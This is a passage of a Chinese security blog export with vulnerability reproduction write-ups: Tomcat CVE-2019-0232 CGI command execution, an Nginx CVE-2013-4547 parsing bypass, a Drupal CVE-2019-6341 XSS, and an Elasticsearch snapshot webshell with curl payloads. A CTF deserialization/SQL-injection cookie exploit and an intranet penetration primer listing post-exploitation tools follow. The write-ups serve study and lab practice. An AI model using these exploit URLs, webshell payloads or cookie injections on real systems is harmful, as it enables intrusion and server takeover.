readOnly 值为 Ture 或注释参数 禁用 PUT 方法并重启 tomcat 服务（如果禁用 PUT 方法，对于依赖PUT方法的应用，可能导致业务失效。） 升级到最新版本 使用WAF产品进行防御 参考文章 https://blog.csdn.net/weixin_45540609/article/details/119170419 https://www.cnblogs.com/rnss/p/13384127.html https://paper.seebug.org/399/","tags":["CVE"],"categories":["CVE漏洞"]},{"title":"Tomcat 远程代码执行CVE-2019-0232","path":"/2023/09/16/tomcat-yuan-cheng-dai-ma-zhi-xing/","content":"0x01 漏洞描述： 2019年4月11日，Apache官方发布通告称将在最新版本中修复一个远程代码执行漏洞（CVE-2019-0232），由于JRE将命令行参数传递给Windows的方式存在错误，会导致CGI Servlet受到远程执行代码的攻击。 触发该漏洞需要同时满足以下条件： 1. 系统为Windows 2. 启用了CGI Servlet（默认为关闭） 3. 启用了enableCmdLineArguments（Tomcat 9.0.*及官方未来发布版本默认为关闭） 影响范围 Apache Tomcat 9.0.0.M1 to 9.0.17 Apache Tomcat 8.5.0 to 8.5.39 Apache Tomcat 7.0.0 to 7.0.93 0x02 漏洞复现： 我的复现环境： windows server 2008 R2 apache Tomcat 8.5.23 jdk 1.8 jdk可以去官网下载，tomcat下载地址：https://archive.apache.org/dist/tomcat/ （最好下载bin目录里的文件） 然后就是配置java环境变量，参考https://www.runoob.com/java/java-environment-setup.html 解压配置tomcat，运行startup.bat,如果这里不能正确弹出命令行窗口显示服务器已运行，可能是java环境变量配置有问题，也可以在startup.bat最后加一个pause让命令行在最后不关闭，看一下是否有报错信息 ![image-20230723163651288](Tomcat 远程代码执行\\image-20230723163651288.png) 配置好之后，需要修改一些tomcat的配置： 1）conf/web.xml 中启用CGIServlet和启用cgi的servlet-mapping 注意这里可能有些版本里的cgiPathPrefix的值是WEB-INF/cgi，需要改一下为我们后面创建的WEB-INF/cgi-bin &lt;servlet&gt; &lt;servlet-name&gt;cgi&lt;/servlet-name&gt; &lt;servlet-class&gt;org.apache.catalina.servlets.CGIServlet&lt;/servlet-class&gt; &lt;init-param&gt; &lt;param-name&gt;cgiPathPrefix&lt;/param-name&gt; &lt;param-value&gt;WEB-INF/cgi-bin&lt;/param-value&gt; &lt;/init-param&gt; &lt;init-param&gt; &lt;param-name&gt;enableCmdLineArguments&lt;/param-name&gt; &lt;param-value&gt;true&lt;/param-value&gt; &lt;/init-param&gt; &lt;init-param&gt; &lt;param-name&gt;executable&lt;/param-name&gt; &lt;param-value&gt;&lt;/param-value&gt; &lt;/init-param&gt; &lt;load-on-startup&gt;5&lt;/load-on-startup&gt; &lt;/servlet&gt; #将下面的语句的注释去掉 &lt;servlet-mapping&gt; &lt;servlet-name&gt;cgi&lt;/servlet-name&gt; &lt;url-pattern&gt;/cgi-bin/*&lt;/url-pattern&gt; &lt;/servlet-mapping&gt; 2）然后修改在conf/context.xml中的添加privileged=\"true\"语句 ![image-20230723165728781](Tomcat 远程代码执行\\image-20230723165728781.png) 3）然后在 ROOT\\WEB-INF 下创建 cgi-bin 目录, 并在该目录下创建一个内容为 echo Content-type: text/html 的 .bat 文件。 Copy例：hello.bat @echo off echo Content-Type: text/plain echo. set foo=%~1 %foo% ![image-20230723165809873](Tomcat 远程代码执行\\image-20230723165809873.png) 成功访问 漏洞利用 访问http://127.0.0.1:8080/cgi-bin/lxhsec.bat?&amp;dir ![image-20230723172844447](Tomcat 远程代码执行\\image-20230723172844447.png) 执行命令http://127.0.0.1:8080/cgi-bin/lxhsec.bat?&amp;C:/WINDOWS/system32/net+user ![image-20230723172916863](Tomcat 远程代码执行\\image-20230723172916863.png) 2.把后面的命令修改成calc.exe弹出计算器：http://localhost:8080/cgi-bin/hello.bat?&amp;C%3A\\Windows\\System32\\calc.exe ![image-20230723172951240](Tomcat 远程代码执行\\image-20230723172951240.png) 漏洞原理具体分析 参考：https://xz.aliyun.com/t/4875 Note:net命令的路径要写全，直接写net user，Tomcat控制台会提示net不是内部命令，也不是可运行的程序，另 必须使用+号连接，使用空格，%2B都会执行失败，控制台报错。 0x03 修复建议 这个默认是关闭的，如果打开了请关闭，若需使用请升级版本。","tags":["CVE"],"categories":["CVE漏洞"]},{"title":"Nginx-文件名逻辑漏洞CVE-2013-4547","path":"/2023/09/16/nginx-wen-jian-ming-luo-ji-lou-dong/","content":"0x01 漏洞描述： 这个漏洞其实和代码执行没有太大的关系,主要原因是错误地解析了请求的URL,错误地获取到用户请求的文件名，导致出现权限绕过、代码执行的连带影响。 影响版本：Nginx 0.8.41 ~ 1.4.3 / 1.5.0 ~ 1.5.7 0x02 漏洞原理： 举个例子,比如,nginx匹配到.php结尾的请求,就发送给fastcgi进行解析,常见的写法如下: location ~ \\.php$ { include fastcgi_params; fastcgi_pass 127.0.0.1:9000; fastcgi_index index.php; fastcgi_param SCRIPT_FILENAME /var/www/html$fastcgi_script_name; fastcgi_param DOCUMENT_ROOT /var/www/html; } 正常情况下(关闭了pathinfo的情况下),只有.php后缀的文件才会被发送给fastcgi解析。 而存在CVE-2013-4547的情况下,我们请求1.gif[0x20][0x00].php，这个URI可以匹配上正则.php$,可以进入这个Location块；但进入后,Nginx却错误地认为请求的文件是1.gif[0x20],就设置其为SCRIPT_FILENAME的值发送给fastcgi。 Fastcgi根据SCRIPT_FILENAME的值进行解析,最后造成了解析漏洞。 所以,我们只需要上传一个空格结尾的文件,即可使PHP解析之。 再举个例子,比如很多网站限制了允许访问后台的IP: location /admin/ { allow 127.0.0.1; deny all; } 我们可以请求如下URI:/test[0x20]/…/admin/index.php,这个URI不会匹配上location后面的/admin/,也就绕过了其中的IP验证;但最后请求的是/test[0x20]/…/admin/index.php文件,也就是/admin/index.php,成功访问到后台。(这个前提是需要有一个目录test:这是Linux系统的特点,如果有一个不存在的目录,则即使跳转到上一层,也会爆文件不存在的错误,Windows下没有这个限制) 0x03 复现过程 在Windows弄了个环境，后来发现要文件名的后面存在空格，而Windows是不允许存在此类文件的，因此这里复现，使用Vulhub的docker进行复现。 访问http://your-ip:8080/ 上传文件 看一下后端过滤 简单明了的黑名单 访问http://your-ip:8080/ 上传文件，在jpg后面加个空格，是的上传的文件名叫做1.jpg[空格] 访问http://your-ip:8080/uploadfiles/1.jpg .php, 并抓包，修改为1.jpg...php, 在Hex选修卡中将jpg后面的两个点2e改成20,00 点击Go,如下。 注意，[0x20]是空格，[0x00]是\\0，这两个字符都不需要编码。 Note:该漏洞不受cgi.fix_pathinfo影响，当其为0时，依旧解析，在Windows上有所限制。 0x04 修复建议 1）设置security.limit_extensions = .php 2）或升级Nginx","tags":["CVE"],"categories":["CVE漏洞"]},{"title":"Drupal XSS漏洞（CVE-2019-6341）","path":"/2023/09/16/drupal-xss-lou-dong-cve-2019-6341/","content":"0x01-漏洞概述 影响软件：Drupal 方式：通过文件模块或者子系统上传恶意文件触发XSS漏洞 参考链接：Drupal 1-click to RCE 分析 效果：JS代码执行（Cookies 资料窃取、会话劫持、钓鱼欺骗、网页挂马等） 0x02-漏洞环境 执行如下命令启动drupal 8.5.0的环境： docker-compose up -d 环境启动后，访问 http://your-ip:8080/ 将会看到drupal的安装页面，一路默认配置下一步安装。因为没有mysql环境，所以安装的时候可以选择sqlite数据库。 0x03-Drupal资料 GPT回答: Drupal是一种独立开源的内容管理系统（Content Management System，简称CMS）。它是用PHP编程语言开发的，并使用MySQL或PostgreSQL数据库进入数据存储。Drupal提供了一套功能强大和灵活的工具，用于构建和管理网站、博客、社区网站、电子商务平台和其他各种在线应用。 Drupal提供了许许多多的功能和模块，使用用户足够的创建和管理各种类型的内容，包括文章、页面、图像、多媒体文件和用户帐户。它还具有强大的用户角色和权限管理系统，使网站管理人员足够对不同的用户给予不同的访问权限。 Drupal的主要优点之一是其灵性和可扩展性。它拥有一个很大的社区，提供了数以千计的模块和主题，可以根据不同的需求和要求进行定制。这使Drupal成为一个非常强大的和适合性能强的平台，可以用于构建各种模板和类型的网站。 总的来说，Drupal是一种功能强大、灵魂活动和可扩展的开源内部管理系统，用于构建和管理各种类型的网站和在线应用。 何为内容管理系统(CMS): 内容管理系统（Content Management System，CMS）可以用来管理、组织和发布各种类型的内容。它提供了一套工具和功能，使用户能够轻松创建、编辑、存储和分发内容，而无需编写代码或具备深入的技术知识。 0x04-漏洞原理 3.1 无后缀文件写入 在Drupal的机制中，设定了这样一条规则。 用户上传的图片文件名将会被保留，如果出现文件名相同的情况，那么文件名后面就会被跟上_0,_1依次递增。 在Drupal中为了兼容各种编码，在处理上传文件名时，Drupal会对文件名对相应的处理，如果出现值小于0x20的字符，那么就会将其转化为_。 ![image-20230615205051359](Drupal XSS漏洞（CVE-2019-6341）\\image-20230615205051359.png) 但如果文件名中，如果出现了\\x80到\\xff的字符时，PHP就会抛出PREG_BAD_UTF8_ERROR，如果发生错误，那么preg_replace就会返回NULL，$basename就会被置为NULL。 ![image-20230615205106915](Drupal XSS漏洞（CVE-2019-6341）\\image-20230615205106915.png) 当basename为空时，后面的文件内容会被写入到形似_0的文件内 ![image-20230615205120047](Drupal XSS漏洞（CVE-2019-6341）\\image-20230615205120047.png) 在这个基础下，原本会被上传到 /sites/default/files/pictures/&lt;YYYY-MM&gt;/ 则会被写入 /sites/default/files/pictures/&lt;YYYY-MM&gt;/_0 当服务端开启了评论头像上传，或者是拥有作者账号时 攻击者可以通过上传一张恶意构造的gif图，然后再上传一张带有恶意字符的同一张图，那么就会将恶意图片的内容写入到相应目录的_0中 ![image-20230615210437063](Drupal XSS漏洞（CVE-2019-6341）\\image-20230615210437063.png) 但如果我们直接访问这个文件时，该文件可能不会解析，这是因为 浏览器首先会根据服务端给出的content-type解析页面，而服务端一般不会给空后缀的文件设置content-type，或者设置为application/octet-stream 其次浏览器会根据文件内容做简单的判断，如果文件的开头为&lt;html&gt;，则部分浏览器会将其解析为html 部分浏览器还可能会设置默认的content-type，但大部分浏览器会选择不解析该文件。 这时候我们就需要一个很特殊的小trick了，a标签可以设置打开文件的type(only not for chrome) 当你访问该页面时，页面会被解析为html并执行相应的代码。 &lt;html&gt; &lt;head&gt; &lt;/head&gt; &lt;body&gt; &lt;a id='a' href=\"http://127.0.0.1/drupal-8.6.2/sites/default/files/2019-04/_6\" type=\"text/html\"&gt;321321&lt;/a&gt; &lt;script type=\"text/javascript\"&gt; var a = document.getElementById('a') a.click() &lt;/script&gt; &lt;/body&gt; &lt;/html&gt; 当被攻击者访问该页面时，我们就可以执行任意的xss，这为后续的利用带来了很大的便利，我们有了一个同源环境下的任意js执行点，让我们继续看。 0x05-漏洞复现 该漏洞需要利用drupal文件模块上传文件的漏洞，伪造一个图片文件，上传，文件的内容实际是一段HTML代码，内嵌JS，这样其他用户在访问这个链接时，就可能触发XSS漏洞。 Drupal 的图片默认存储位置为 /sites/default/files/pictures/&lt;YYYY-MM&gt;/，默认存储名称为其原来的名称，所以之后在利用漏洞时，可以知道上传后的图片的具体位置。 使用PoC上传构造好的伪造GIF文件，PoC参考thezdi/PoC的PoC。 如图，输入如下命令，即可使用PoC构造样本并完成上传功能，第一个参数为目标IP 第二个参数为目标端口。 ![image-20230615212825825](Drupal XSS漏洞（CVE-2019-6341）\\image-20230615212825825.png) 上传成功后，访问图片位置，即可触发 XSS 漏洞，如下图所示。 尖端： 因为 Chrome 和 FireFox 浏览器自带部分过滤 XSS 功能，所以验证存在时可使用 Edge 浏览器或者 IE 浏览器。 访问的图片名称为_0的原因是因为 Drupal 的规则机制，具体原理见Drupal 1-click to RCE 分析 /var/www/html/drupal/sites/default/files/pictures/YYYY-MM 这里的时间应该是你上传的时候的北京时间因此我这里的访问路径为 http://185.243.241.45:8080/sites/default/files/pictures/2023-06/_0 ![image-20230615213558660](Drupal XSS漏洞（CVE-2019-6341）\\image-20230615213558660.png) 但不知为何我这里edge浏览器也不显示弹窗","tags":["CVE"],"categories":["CVE漏洞"]},{"title":"Elasticsearch写入webshell漏洞（WooYun-2015-110216）","path":"/2023/09/11/elasticsearch-xie-ru-webshell-lou-dong-wooyun-2015-110216/","content":"0x01 漏洞描述 ElasticSearch具有备份数据的功能，用户可以传入一个路径，让其将数据备份到该路径下，且文件名和后缀都可控。 所以，如果同文件系统下还跑着其他服务，如Tomcat、PHP等，我们可以利用ElasticSearch的备份功能写入一个webshell。 和CVE-2015-5531类似，该漏洞和备份仓库有关。在elasticsearch1.5.1以后，其将备份仓库的根路径限制在配置文件的配置项path.repo中，而且如果管理员不配置该选项，则默认不能使用该功能。即使管理员配置了该选项，web路径如果不在该目录下，也无法写入webshell。所以该漏洞影响的ElasticSearch版本是1.5.x以前。 0x02 漏洞搭建 编译与启动测试环境： docker-compose build docker-compose up -d 简单介绍一下本测试环境。本测试环境同时运行了 Tomcat 和 ElasticSearch，Tomcat 目录在 /usr/local/tomcat，web 目录是 /usr/local/tomcat/webapps；ElasticSearch 目录在 /usr/share/elasticsearch。 我们的目标就是利用 ElasticSearch，在 /usr/local/tomcat/webapps 目录下写入我们的 webshell。 0x03 漏洞复现 访问存在的漏洞页面：（9200一般为ElasticSearch的常用端口），此漏洞环境需要与tomcat结合使用，发现8080端口存在tomcat默认配置页面。 发现9200端口存在elasticsearch页面：版本为1.5.1,确认存在漏洞 测试流程 首先创建一个恶意索引文档： curl -XPOST http://ip:9200/yz.jsp/yz.jsp/1 -d' {\"&lt;%new java.io.RandomAccessFile(application.getRealPath(new String(new byte[]{47,116,101,115,116,46,106,115,112})),new String(new byte[]{114,119})).write(request.getParameter(new String(new byte[]{102})).getBytes());%&gt;\":\"test\"}' 这里要用kali发送 再创建一个恶意的存储库，其中 location 的值即为我要写入的路径。 ​ 园长：这个 Repositories 的路径比较有意思，因为他可以写到可以访问到的任意地方，并且如果这个路径不存在的话会自动创建。那也就是说你可以通过文件访问协议创建任意的文件夹。 ​ 这里我把这个路径指向到了 tomcat 的 web 部署目录，因为只要在这个文件夹创建目录 Tomcat 就会自动创建一个新的应用 (文件名为 wwwroot 的话创建出来的应用名称就是 wwwroot 了)。 curl -XPUT 'http://ip:9200/_snapshot/yz.jsp' -d '{ \"type\": \"fs\", \"settings\": { \"location\": \"/usr/local/tomcat/webapps/wwwroot/\", \"compress\": false } }' 存储库验证并创建: curl -XPUT \"http://ip:9200/_snapshot/yz.jsp/yz.jsp\" -d '{ \"indices\": \"yz.jsp\", \"ignore_unavailable\": \"true\", \"include_global_state\": false }' 完成！ 前三步主要是创建一个snapshot-yz.jsp脚本向wwwroot下的test.jsp文件中写入任意字符串） 访问 http://ip:8080/wwwroot/indices/yz.jsp/snapshot-yz.jsp，这就是我们写入的 webshell。 该 shell 的作用是向 wwwroot 下的 test.jsp 文件中写入任意字符串，如：http://ip:8080/wwwroot/indices/yz.jsp/snapshot-yz.jsp?f=success。 我们再访问 /wwwroot/test.jsp 就能看到 success 了： 现在来写入一句话木马，哥斯拉生成一句话木马： 生成jsp的shell： 如上图进行配置生成木马。 URL编码jsp的shell并在f=后输入改编码好的shell: 访问test.jsp发现成功上传shell，直接哥斯拉连接一下 点击测试连接发现成功，直接添加看看 发现成功rce 0x04 修复建议 1、升级版本 2、将repo目录权限设置为仅可读，不可写（自己建议的，仅在不影响业务的前提下） 0x05 参考文章 -wooyun-2015-110216 Elasticsearch写入webshell 漏洞复现-wooyun-2015-110216-Elasticsearch写入webshell Elasticsearch写入webshell漏洞（WooYun-2015-110216）","tags":["CVE"],"categories":["CVE漏洞"]},{"title":"攻防世界-warmup","path":"/2023/09/06/ti-mu-ming-cheng-warmup/","content":"题目描述： 平平无奇的输入框 题目解题： 先尝试了几下弱口令，没用，那看一下题目给的附件，发现是源码，那开始审计（这里取关键部分） conn.php &lt;?php include 'flag.php'; class SQL { public $table = ''; public $username = ''; public $password = ''; public $conn; public function __construct() { } public function connect() { //与数据库连接 $this-&gt;conn = new mysqli(\"localhost\", \"xxxxx\", \"xxxx\", \"xxxx\"); } public function check_login(){ $result = $this-&gt;query(); if ($result === false) {//进行数据库的查询 die(\"database error, please check your input\"); } $row = $result-&gt;fetch_assoc();//从结果中取得一行作为关联数组 if($row === NULL){ die(\"username or password incorrect!\"); }else if($row['username'] === 'admin'){//若username=admin则输出flag $flag = file_get_contents('flag.php'); echo \"welcome, admin! this is your flag -&gt; \".$flag; }else{ echo \"welcome! but you are not admin\"; } $result-&gt;free(); } public function query() { $this-&gt;waf();//参数的过滤 return $this-&gt;conn-&gt;query (\"select username,password from \".$this-&gt;table.\" where username='\".$this-&gt;username.\"' and password='\".$this-&gt;password.\"'\"); } public function waf(){ $blacklist = [\"union\", \"join\", \"!\", \"\\\"\", \"#\", \"$\", \"%\", \"&amp;\", \".\", \"/\", \":\", \";\", \"^\", \"_\", \"`\", \"{\", \"|\", \"}\", \"&lt;\", \"&gt;\", \"?\", \"@\", \"[\", \"\\\\\", \"]\" , \"*\", \"+\", \"-\"];//设置黑名单 foreach ($blacklist as $value) { if(strripos($this-&gt;table, $value)){ die('bad hacker,go out!'); } } foreach ($blacklist as $value) { if(strripos($this-&gt;username, $value)){ die('bad hacker,go out!'); } } foreach ($blacklist as $value) {//以上都是foreach循环，分别检测table，用户名和密码是否有敏感字符 if(strripos($this-&gt;password, $value)){ die('bad hacker,go out!'); } } } public function __wakeup(){//反序列化自动调用 if (!isset ($this-&gt;conn)) { $this-&gt;connect ();//连接数据库 } if($this-&gt;table){ $this-&gt;waf(); } $this-&gt;check_login(); $this-&gt;conn-&gt;close(); } } ?&gt; index.php &lt;?php include 'conn.php'; include 'flag.php'; if (isset ($_COOKIE['last_login_info'])) { $last_login_info = unserialize (base64_decode ($_COOKIE['last_login_info']));//传入一个base加密的cookie参数 try {\t//检测传入的参数是否是数组 //正在浏览当前页面用户的 IP 地址。 if (is_array($last_login_info) &amp;&amp; $last_login_info['ip'] != $_SERVER['REMOTE_ADDR']) { die('WAF info: your ip status has been changed, you are dangrous.'); } } catch(Exception $e) { die('Error'); } } else { $cookie = base64_encode (serialize (array ( 'ip' =&gt; $_SERVER['REMOTE_ADDR']))) ; setcookie ('last_login_info', $cookie, time () + (86400 * 30)); } if(isset($_POST['username']) &amp;&amp; isset($_POST['password'])){ $table = 'users'; $username = addslashes($_POST['username']); $password = addslashes($_POST['password']); $sql = new SQL(); $sql-&gt;connect(); $sql-&gt;table = $table; $sql-&gt;username = $username; $sql-&gt;password = $password; $sql-&gt;check_login(); } ?&gt; ip.php &lt;?php echo $_SERVER['REMOTE_ADDR']; 先访问ip.php拿到ip：218.26.154.43 这里看代码发现cookie也会自动设置，因此我们查看一下 发现疑似base64的，解码一下看看 方法一： 所得到已知信息 1.在Cookie中存在序列化字符串,用来记录访问者IP 2.前端传入username,password时,首先会被转义再进行过滤,只能使用 ’ 符号 3.在conn.php文件中存在一个SQL方法,其中waf过滤函数将table,username,password参数都进行了过滤,但是table参数没有进行addslashes()函数转义处理 构造poc O:3:\"SQL\":4:{s:5:\"table\";s:41:\"(select 'admin' username,'123' password)a\";s:8:\"username\";s:5:\"admin\";s:8:\"password\";s:3:\"123\";s:4:\"conn\";N;}} 这里解释一下table内容的含义： ’ or ‘1’='1 select 值1 字段1，值2，字段2 可以生成表 字段1 字段2 值1 值2 上述属于sql中的子查询，且子查询后面必须跟一个别名，解释如下： 在复杂查询语句中，我们可能会用到子查询。 select id from (select * from table_name)a 上面我们将子查询查询出来的结果当成一张新表来操作。同时，为这张新表指定了别名 a ，这个别名是一定需要指定的，否则会报错。 所以上述序列化字符串执行后，相当于建立了一个新表，名字为a，其中用户名值为admin，密码为123。符合代码中username=admin的要求 base64编码后，传入cookie TzozOiJTUUwiOjQ6e3M6NToidGFibGUiO3M6NDE6IihzZWxlY3QgJ2FkbWluJyB1c2VybmFtZSwnMTIzJyBwYXNzd29yZClhIjtzOjg6InVzZXJuYW1lIjtzOjU6ImFkbWluIjtzOjg6InBhc3N3b3JkIjtzOjM6IjEyMyI7czo0OiJjb25uIjtOO319 得到flag 方法二： 这里也可以采用类似如下poc O:3:\"SQL\":5:{s:5:\"table\";s:5:\"users\";s:8:\"username\";s:5:\"admin\";s:8:\"password\";s:11:\"' or '1'='1\";s:4:\"conn\";N;s:10:\"SQL_wakeup\";N;} 由于前端页面对用户名和密码进行了字符转义，那我们可以通过sql语句来绕过前端转义，接着在进行数据库查询时，由于passowrd是万能密码，于是成功绕过，实现username=admin 参考文章： 【愚公系列】2023年06月 攻防世界-Web（题目名称-warmup） 其余可以等提交了flag，查看题目自带wp","categories":["攻防世界"]},{"title":"内网渗透学习-基础知识","path":"/2023/09/05/nei-wang-shen-tou-xue-xi-ji-chu-pian/","content":"内网也指局域网，是指在某一区域由多台计算机互连而成的计算机组。 一、内网基础知识 0x01 工作组 对局域网中的计算机进行分类，使得网络更有序。计算机的管理依然是各自为政，所有计算机依然是对等的，松散会员制，可以随意加入和退出，且不同工作组之间的共享资源可以相互访问。 0x02 域 分类：单域、子域、父域、域树、域森林、DNS域名服务器 “域”是一个有安全边界的计算机组合（一个域中的用户无法访问另一个域中的资源），域内资源由一台域控制器（Domain Controller，DC）集中管理，用户名和密码是放在域控制器去验证的。 优点：通过组策略来统一管理。 单域：即只有一个域的网络环境，一般需要两台DC，一台DC，另一台备用DC（容灾） 父子域：类比公司总部和公司分部的关系，总部的域称为父域，各分部的域称为该域的子域。使用父子域的好处： 减小了域之间信息交互的压力（域内信息交互不会压缩，域间信息交互可压缩） 不同的子域可以指定特定的安全策略 父子域中域名使用一个.表示一个层次，类似于DNS域名表示方式，子域只能使用父域的名字作为域名后缀 域树：多个域通过建立信任关系组成的集合。若两个域之间需要相互访问，需要建立信任关系（Trust Relation），通过信任关系可以将父子域连接成树状结构 域森林：多个域树通过建立信任关系组成的集合。 DNS域名服务器：实现域名到IP地址的转换。由于域中计算机使用DNS来定位DC、服务器和其他计算机，所以域的名字就是DNS域的名字。 内网渗透中，大都是通过寻找DNS服务器来确定域控制器位置（因为DNS服务器和域控制器通常配置在一台机器上） 0x03 活动目录 活动目录（Active Directory，AD）是指域环境中提供目录服务的组件，用于存储有关网络对象（用户、组、计算机、共享资源、联系人）的信息。基于活动目录有目录服务，用于帮助用户从活动目录中快速找到所需的消息。活动目录使得企业可以对网络环境进行集中管理。（可类比为内网中的索引，里面存储有内网里所有资源的快捷方式） 活动目录的逻辑结构包含组织单元、域、域树、域森林。域树内的所有域共享一个活动目录，因此非常适合进行统一管理。 活动目录的功能： 账号集中管理 软件集中管理 环境集中管理 增强安全性 更可靠、更短的宕机时间 **域和活动目录的区别：**要实现域环境，其实就是要安装AD。一台计算机安装了AD之后就变成了DC。 下面解释一下AD与DC的区别 0x04 AD与DC的区别 如果网络规模较大，我们就会考虑把网络中的众多对象：计算机、用户、用户组、打印机、共享文件等，分门别类、井然有序地放在一个大仓库中，并做好检索信息，以利于查找、管理和使用这些对象（资源）。这个有层次结构的数据库，就是活动目录数据库，简称AD库。 那么我们应该把这个数据库放在哪台计算机上呢？规定是这样的，我们把存放有活动目录数据库的计算机就称为DC。所以说我们要实现域环境，其实就是要安装AD，当内网中的一台计算机安装了AD后，它就变成了DC。 那么有了域环境的话，回答最初的问题：在域环境中，只需要在活动目录中创建一次Alan账户，那么就可以在任意200台电脑中的一台上登录Alan，如果要为Alan账户更改密码，只需要在活动目录中更改一次就可以了。 0x05 安全域的划分 5.1 内网 安全级别最高 分为核心区（存储企业最重要的数据，只有很少的主机能够访问）和办公区（员工日常工作区，一般能够访问DMZ，部分主机可以访问核心区） 5.2 DMZ（Demilitarized Zone） 边界网络，隔离区，安全级别中等 作为内网中安全系统和非安全系统之间的缓冲区，用于对外提供服务，一般可以放置一些必须公开的服务器设施 5.3 外网 Internet，安全级别最低 拥有DMZ的网络需要制定一些访问控制策略： 1.内网可以访问外网 2.内网可以访问DMZ 3.外网不能访问内网 4.外网可以访问DMZ 5.DMZ不能访问内网 6.DMZ不能访问外网 0x06 域中计算机的分类 域控制器、成员服务器、客户机、独立服务器 域控制器：用于管理所有的网络访问，存储域内所有的账户和策略信息。允许网络中拥有多台域控制器（容灾） 成员服务器：安装了服务器操作系统并加入了域，但没有安装活动目录的计算机，主要任务是提供网络资源 客户机：安装了其他操作系统的计算机，利用这些计算机和域中的账户就可以登录到域。 独立服务器：和域无关，既不加入域，也没有活动目录 域控制器是存放活动目录数据库的，是域中必须要有的，而其他三种则不是必须的，也就是说最简单的域可以只包含一台计算机，这台计算机就是该域的域控制器。 域中各个服务器的角色也是可以改变的，例如域服务器在删除活动目录时，如果是域中最后一个域控制器，则该域服务器会成为独立服务器，如果不是域中唯一的域控制器，则将使该服务器成为成员服务器。 同时独立服务器既可以转换为域控制器，也可以加入到某个域成为成员服务器。 0x07 域内权限 组： 组（Group）是用户帐号的集合。通过向一组用户分配权限从而不必向每个用户分配权限，管理员在日常工作中不必要去为单个用户帐号设置自己独特的访问权限，而是将用户帐号加入到相对应的安全组中。管理员通过给相对的安全组访问权限就可以了，这样所有加入到安全组的用户帐号都将有同样的权限。使用安全组而不是单个的用户帐号可以方便，简化网络的维护和管理工作。 域本地组： 多域用户访问单域资源（访问同一个域）。可以从任何域添加用户账户、通用组和全局组，只能在其所在域内指派权限。域本地组不能嵌套于其他组中。它主要是用于授予位于本域资源的访问权限。 全局组： 单域用户访问多域资源（必须是同一个域里面的用户）。只能在创建该全局组的域上进行添加用户和全局组，可以在域森林中的任何域中指派权限，全局组可以嵌套在其他组中。 通用组： 通用组成员来自域林中任何域中的用户账户、全局组和其他的通用组，可以在该域林中的任何域中指派权限，可以嵌套于其他域组中。非常适于域林中的跨域访问。 可以简单这样记忆： 域本地组：来自全林用于本域 全局组：来自本域用于全林 通用组：来自全林用于全林 0x07 A-G-DL-P策略： A：用户账户 G：全局组 DL：域本地组 P：许可，资源权限 先将用户账号添加至全局组中，再将全局组添加至域本地组中，然后为域本地组分配资源权限。按照AGDLP的原则对用户进行组织和管理起来更容易。 在AGDLP形成以后,当给一个用户某一个权限的时候,只要把这个用户加入到某一个本地域组就可以了。 0x08 域内权限解读 8.1 域本地组 来自全林作用于本域 Administrators（管理员组） ————最重要的权限 Remote Desktop Users(远程登录组) Print Operators（打印机操作员组） Account Operators（帐号操作员组） Server Operaters（服务器操作员组） Backup Operators（备份操作员组） 8.2 全局组 来自本域作用于全林 8.3 通用组 来自全林作用于全林 8.4 全局组、通用组的权限 Domain Admins（域管理员组）————最最最重要的权限，一般来说域渗透是看重这个 Enterprise Admins（企业系统管理员组）————最重要的权限，其次是去看重这个权限 Schema Admins（架构管理员组）————最重要的权限 Domain Users（域用户组) 1.通常DNS服务器与域控制器会在同一台机器上 2.一个域内至少需要两台DC，需要一台用作备份 二、常用工具分类 0x01 主机平台及常用工具总结 WCE（Windows凭据管理器） minikatz（从内存中获取明文密码） Responder（嗅探网络中所有的LLMNR包，获取主机的信息） BeEF（一款针对浏览器的渗透测试工具） DSHashes（从NTDSXtract中提取用户易于理解的散列值） PowerSploit（一款基于PowerShell的后渗透测试框架） Nishang（一款针对Powershell的渗透测试工具） Empire（一款内网渗透测试利器） ps_encoder.py（使用Base64编码封装的Powershell命令包） smbexec（一个使用samba工具的快速psExec工具） 后门制造工厂（对PE、ELF等二进制注入Shellcode） Veil（用于生成绕过常见杀软的Metasploit有效载荷） Metasploit（计算机安全漏洞项目框架） Cobalt Strike（一款优秀的后渗透测试平台） 0x02 Windows渗透常用工具 Nmap（一款免费的网络发现和安全审计工具） Wireshark（一款免费且开源的网络协议和数据包解析器） PuTTY（一款免费且开源的SSH和Telnet客户端） SQLMap（一款免费且开源的SQL注入工具） BurpSuite（一款针对Web应用程序进行安全测试的代理工具） Hydra（一个网络登录暴力破解工具） Getif（一款收集SNMP设备信息的工具） Cain&amp;Abel（一个密码恢复工具，集成嗅探等多种功能） PowerSploit（一款基于PowerShell的后渗透测试框架） Nishang（一款针对Powershell的渗透测试工具） 0x03 PowerShell基本命令 3.1 查看Powershell版本 Get-Host $PSVersionTable.PSVERSION 3.2 Powershell 常用命令 New-Item hack -ItemType Directory #新建目录 New-Item ailx0000.txt -ItemType File #新建文件 Set-Content .\\ailx0000.txt -Value \"hi hacker ailx10...\" #写文件 Add-Content .\\ailx0000.txt -Value \"ooops~\" #追加内容 Get-Content .\\ailx0000.txt #显示内容 Clear-Content .\\ailx0000.txt #清楚内容 Remove-Item .\\ailx0000.txt #删除文件 3.3 常见用途 1、绕过本地权限并执行 2、从网站服务器中下载脚本，绕过本地权限并偷偷执行 3、使用Base64对PowerShell命令进行编码 三、内网环境搭建 实验：搭建内网环境 1.搭建域环境 实验环境 工具： vmvare、winserver2012、winserver2008、win7镜像 下载地址：MSDN 1、winserver2012 R2搭建 1.首先配置win12的ip地址。我们可以先ipconfig查看其地址和默认网关等，然后配置成其静态IP等。 这里应该是192.168.17.129（照片错误） 2.在控制面板-系统和安全-系统-高级系统设置、域和工作组-计算机名–更改–计算机名 3.安装域控制器和dns服务。 选择服务器管理器，选择添加角色和功能向导，在服务器角色 选择DNS服务器 在服务器角色窗口选择Active Directory域服务和DNS服务器 一路默认设置到确认页面 勾选自动重新启动服务器，然后安装。 4.升级服务器 安装完毕后。点击将此服务器提升为域控制器 在Active Directory域服务配置向导界面，在部署配置部分单击选中”添加新林”，然后输入根域名”hacke.testlab”(必须使用符合DNS命名约定的根域名)。 在域控制器选项部分，将林功能级别，域功能级别都设置成”Windows Server 2012 R2”。创建域林时，在默认情况下应选择DNS服务器，林中的第一个域控制器必须是全局目录服务器且不能是只读域控制器（RODC）。然后，设置目录服务还原模式的密码（在开机进入安全模式修复活动目录数据库时使用此密码） 然后到DNS选项，会出现关于DNS的警告。不用理会警告，保持默认设置。 然后一路都是默认配置 安装完成后重启 5.创建Active Directory 用户 为win2008和win7用户创建域控制器账户。 在”Active Directory”用户和计算机界面中选择”Users”目录并单击右键，使用弹出的快捷菜单添加用户。 创建testuser账户 2、Win2008 